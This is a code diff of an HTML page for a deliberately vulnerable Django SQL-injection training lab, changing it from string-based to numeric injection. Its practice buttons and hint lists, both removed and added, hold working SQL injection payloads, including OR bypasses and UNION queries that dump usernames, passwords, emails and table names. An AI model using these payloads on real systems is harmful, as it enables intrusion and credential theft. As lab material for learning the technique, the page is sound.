@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lab 1: Error-Based SQL Injection - SQLi Labs Django</title>
+    <title>Lab 2: Numeric SQL Injection - SQLi Labs Django</title>
     <style>
         * {
             margin: 0;
@@ -33,7 +33,7 @@
 
         .title {
             font-size: 32px;
-            color: #ff4444;
+            color: #2196F3;
             margin-bottom: 10px;
             font-weight: 600;
         }
@@ -45,8 +45,8 @@
         }
 
         .lab-info {
-            background: rgba(255, 68, 68, 0.1);
-            border: 1px solid #ff4444;
+            background: rgba(33, 150, 243, 0.1);
+            border: 1px solid #2196F3;
             border-radius: 10px;
             padding: 20px;
             margin-bottom: 30px;
@@ -149,6 +149,46 @@
             box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
         }
 
+        .practice-section {
+            background: rgba(33, 150, 243, 0.1);
+            border: 1px solid #2196F3;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .practice-header {
+            color: #2196F3;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .practice-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+        }
+
+        .practice-btn {
+            background: rgba(33, 150, 243, 0.2);
+            border: 1px solid #2196F3;
+            color: #ffffff;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+        }
+
+        .practice-btn:hover {
+            background: rgba(33, 150, 243, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(33, 150, 243, 0.3);
+        }
+
         .result-section {
             margin-top: 30px;
         }
@@ -210,113 +250,6 @@
             border-radius: 5px;
         }
 
-        .hints-section {
-            background: rgba(255, 152, 0, 0.1);
-            border: 1px solid #ff9800;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            display: none; /* Hidden by default */
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-        }
-
-        .hints-section.show {
-            display: block;
-            opacity: 1;
-        }
-
-
-
-        .btn-hints {
-            background: linear-gradient(45deg, #ff9800, #ff5722);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-hints:hover {
-            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.4);
-        }
-
-        .hints-header {
-            color: #ff9800;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-
-        .hint-item {
-            color: #ffeb3b;
-            margin-bottom: 10px;
-            padding-left: 0px;
-            position: relative;
-        }
-
-        .navigation {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 30px;
-            padding: 0 10px;
-        }
-
-        .navigation-left {
-            flex: 1;
-        }
-
-        .navigation-right {
-            flex: 1;
-            text-align: right;
-        }
-
-        .practice-section {
-            background: rgba(33, 150, 243, 0.1);
-            border: 1px solid #2196F3;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        .practice-header {
-            color: #2196F3;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-
-        .practice-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-        }
-
-        .practice-btn {
-            background: rgba(33, 150, 243, 0.2);
-            border: 1px solid #2196F3;
-            color: #ffffff;
-            padding: 10px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s ease;
-            font-family: 'Courier New', monospace;
-        }
-
-        .practice-btn:hover {
-            background: rgba(33, 150, 243, 0.4);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(33, 150, 243, 0.3);
-        }
-
-        .btn-home {
-            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
-        }
-
-        .btn-home:hover {
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-
         .user-data {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -342,6 +275,71 @@
             font-family: 'Courier New', monospace;
             font-size: 16px;
             margin-top: 5px;
+        }
+
+        .navigation {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            padding: 0 10px;
+        }
+
+        .navigation-left {
+            flex: 1;
+        }
+
+        .navigation-right {
+            flex: 1;
+            text-align: right;
+        }
+
+        .btn-home {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
+        }
+
+        .btn-home:hover {
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+        }
+
+        .btn-hints {
+            background: linear-gradient(45deg, #ff9800, #ff5722);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-hints:hover {
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.4);
+        }
+
+        .hints-section {
+            background: rgba(255, 152, 0, 0.1);
+            border: 1px solid #ff9800;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .hints-section.show {
+            display: block;
+            opacity: 1;
+        }
+
+        .hints-header {
+            color: #ff9800;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .hint-item {
+            color: #ffeb3b;
+            margin-bottom: 10px;
+            padding-left: 0px;
+            position: relative;
         }
 
         @media (max-width: 768px) {
@@ -379,30 +377,30 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="title">Lab 1: Error-Based SQL Injection</div>
-            <div class="subtitle">Learn to exploit error-based SQL injection vulnerabilities</div>
+            <div class="title">Lab 2: Numeric SQL Injection</div>
+            <div class="subtitle">Learn numeric-based SQL injection without quotes</div>
         </div>
 
         <div class="lab-info">
-            <strong>Objective:</strong> This lab demonstrates string-based SQL injection. The query structure is: <code>SELECT id, username, password FROM labsPage_user WHERE username = '{username}'</code>
+            <strong>Objective:</strong> This lab demonstrates numeric-based SQL injection. The query structure is: <code>SELECT id, username, password FROM labsPage_user WHERE id = {user_id}</code>
             <br><br>
-            <strong>String Injection Strategy:</strong> Since the username parameter is wrapped in single quotes, use these techniques:
+            <strong>Numeric Injection Strategy:</strong> Since the ID parameter is numeric (no quotes), use these techniques:
             <ul style="margin-top: 10px; margin-left: 20px;">
-                <li><code>'</code> - Test for quote termination (should cause syntax error)</li>
-                <li><code>' OR '1'='1</code> - Classic bypass technique</li>
-                <li><code>' UNION SELECT ...</code> - Combine results from multiple tables</li>
-                <li><code>' AND 1=1--</code> - True condition with comment</li>
-                <li><code>' AND 1=2--</code> - False condition test</li>
+                <li><code>1 AND 1=1</code> - Test for true condition (should return normal result)</li>
+                <li><code>1 AND 1=2</code> - Test for false condition (should return no result)</li>
+                <li><code>1 OR 1=1</code> - Always true condition (bypasses WHERE clause)</li>
+                <li><code>1 UNION SELECT ...</code> - Combine results from multiple queries</li>
+                <li><code>999 OR 1=1</code> - Invalid ID but always true condition</li>
             </ul>
         </div>
 
         <div class="lab-card">
-            <div class="lab-header">User Lookup System</div>
+            <div class="lab-header">User ID Lookup System</div>
             
             <form method="GET" class="input-section">
                 <div class="input-group">
-                    <label class="input-label">Username:</label>
-                    <input type="text" name="username" class="input-field" value="{{ username }}" placeholder="Enter username (e.g., admin, Dumb...)">
+                    <label class="input-label">User ID:</label>
+                    <input type="text" name="id" class="input-field" value="{{ user_id }}" placeholder="Enter user ID (e.g., 1, 2, 3...)">
                     <button type="submit" class="btn btn-submit">Search</button>
                 </div>
             </form>
@@ -410,16 +408,16 @@
             <div class="practice-section">
                 <div class="practice-header">Quick Test Cases</div>
                 <div class="practice-grid">
-                    <button class="practice-btn" data-payload="admin" onclick="testPayload(this)">Normal: admin</button>
-                    <button class="practice-btn" data-payload="'" onclick="testPayload(this)">Quote Test: '</button>
-                    <button class="practice-btn" data-payload="' OR '1'='1" onclick="testPayload(this)">OR Bypass: ' OR '1'='1</button>
-                    <button class="practice-btn" data-payload="' OR 1=1--" onclick="testPayload(this)">OR Comment: ' OR 1=1--</button>
-                    <button class="practice-btn" data-payload="' AND '1'='1" onclick="testPayload(this)">AND True: ' AND '1'='1</button>
-                    <button class="practice-btn" data-payload="' AND '1'='2" onclick="testPayload(this)">AND False: ' AND '1'='2</button>
-                    <button class="practice-btn" data-payload="' UNION SELECT 1,username,password FROM labsPage_user--" onclick="testPayload(this)">UNION All Users</button>
-                    <button class="practice-btn" data-payload="' UNION SELECT 1,email_id,'test' FROM labsPage_email--" onclick="testPayload(this)">UNION Emails</button>
-                    <button class="practice-btn" data-payload="' UNION SELECT 1,database(),version()--" onclick="testPayload(this)">DB Info</button>
-                    <button class="practice-btn" data-payload="admin'/**/OR/**/'1'='1" onclick="testPayload(this)">Comment Bypass</button>
+                    <button class="practice-btn" data-payload="1" onclick="testPayload(this)">Normal: 1</button>
+                    <button class="practice-btn" data-payload="1 AND 1=1" onclick="testPayload(this)">True Test: 1 AND 1=1</button>
+                    <button class="practice-btn" data-payload="1 AND 1=2" onclick="testPayload(this)">False Test: 1 AND 1=2</button>
+                    <button class="practice-btn" data-payload="1 OR 1=1" onclick="testPayload(this)">OR Bypass: 1 OR 1=1</button>
+                    <button class="practice-btn" data-payload="999 OR 1=1" onclick="testPayload(this)">Invalid + OR: 999 OR 1=1</button>
+                    <button class="practice-btn" data-payload="1 UNION SELECT 1,2,3" onclick="testPayload(this)">UNION Test: 1 UNION SELECT 1,2,3</button>
+                    <button class="practice-btn" data-payload="1 UNION SELECT id,username,password FROM labsPage_user" onclick="testPayload(this)">UNION All Users</button>
+                    <button class="practice-btn" data-payload="999 UNION SELECT 1,email_id,'email' FROM labsPage_email" onclick="testPayload(this)">UNION Emails</button>
+                    <button class="practice-btn" data-payload="1 AND (SELECT COUNT(*) FROM labsPage_user)>0" onclick="testPayload(this)">Count Users</button>
+                    <button class="practice-btn" data-payload="1 UNION SELECT 1,database(),version()" onclick="testPayload(this)">DB Version</button>
                 </div>
             </div>
 
@@ -472,36 +470,32 @@
         </div>
 
         <div class="hints-section" id="hintsSection">
-            <div class="hints-header">SQL Injection Hints</div>
-            <div class="hint-item"><strong>Numeric Injection Basics:</strong></div>
-            <div class="hint-item">Test true condition: <code>1 AND 1=1</code></div>
-            <div class="hint-item">Test false condition: <code>1 AND 1=2</code></div>
+            <div class="hints-header">Numeric SQL Injection Hints</div>
+            <div class="hint-item"><strong>Basic Logic Tests:</strong></div>
+            <div class="hint-item">True condition: <code>1 AND 1=1</code></div>
+            <div class="hint-item">False condition: <code>1 AND 1=2</code></div>
             <div class="hint-item">OR bypass: <code>1 OR 1=1</code></div>
-            <div class="hint-item">Always true: <code>999 OR 1=1</code></div>
+            <div class="hint-item">Invalid ID bypass: <code>999 OR 1=1</code></div>
             
             <div class="hint-item"><strong>UNION Attacks:</strong></div>
-            <div class="hint-item">Column count test: <code>1 UNION SELECT 1,2</code></div>
-            <div class="hint-item">Extract all users: <code>1 UNION SELECT username,password FROM labsPage_user</code></div>
-            <div class="hint-item">Extract emails: <code>1 UNION SELECT email_id,2 FROM labsPage_email</code></div>
-            <div class="hint-item">Invalid ID + UNION: <code>999 UNION SELECT username,password FROM labsPage_user</code></div>
+            <div class="hint-item">Column count: <code>1 UNION SELECT 1,2,3</code></div>
+            <div class="hint-item">All users: <code>1 UNION SELECT id,username,password FROM labsPage_user</code></div>
+            <div class="hint-item">Emails: <code>999 UNION SELECT 1,email_id,'email' FROM labsPage_email</code></div>
             
             <div class="hint-item"><strong>Information Gathering:</strong></div>
-            <div class="hint-item">Count users: <code>1 AND (SELECT COUNT(*) FROM labsPage_user)>0</code></div>
-            <div class="hint-item">Database name: <code>1 AND (SELECT LENGTH(database()))>0</code></div>
-            <div class="hint-item">Table existence: <code>1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='labsPage_user')>0</code></div>
-            <div class="hint-item">Version info: <code>1 UNION SELECT VERSION(),2</code></div>
+            <div class="hint-item">Count records: <code>1 AND (SELECT COUNT(*) FROM labsPage_user)>0</code></div>
+            <div class="hint-item">Database info: <code>1 UNION SELECT 1,database(),version()</code></div>
+            <div class="hint-item">Table names: <code>1 UNION SELECT 1,table_name,'table' FROM information_schema.tables</code></div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Auto-focus on the input field
             const inputField = document.querySelector('.input-field');
             if (inputField && !inputField.value) {
                 inputField.focus();
             }
 
-            // Add some visual feedback for the form submission
             const form = document.querySelector('form');
             if (form) {
                 form.addEventListener('submit', function() {
@@ -517,7 +511,6 @@
             const hintsButton = document.querySelector('.btn-hints');
             
             if (hintsSection.classList.contains('show')) {
-                // Hide hints
                 hintsSection.classList.remove('show');
                 hintsButton.textContent = 'Show SQL Injection Hints';
                 hintsSection.style.opacity = '0';
@@ -525,7 +518,6 @@
                     hintsSection.style.display = 'none';
                 }, 300);
             } else {
-                // Show hints
                 hintsSection.style.display = 'block';
                 hintsSection.classList.add('show');
                 hintsButton.textContent = 'Hide SQL Injection Hints';
@@ -533,20 +525,14 @@
                     hintsSection.style.opacity = '1';
                 }, 10);
                 
-                // Smooth scroll to hints section
                 hintsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
             }
         }
 
         function testPayload(button) {
-            // Get the payload from the data attribute
             const payload = button.getAttribute('data-payload');
-            
-            // Set the input field value
             const inputField = document.querySelector('.input-field');
             inputField.value = payload;
-            
-            // Submit the form
             const form = document.querySelector('form');
             form.submit();
         }
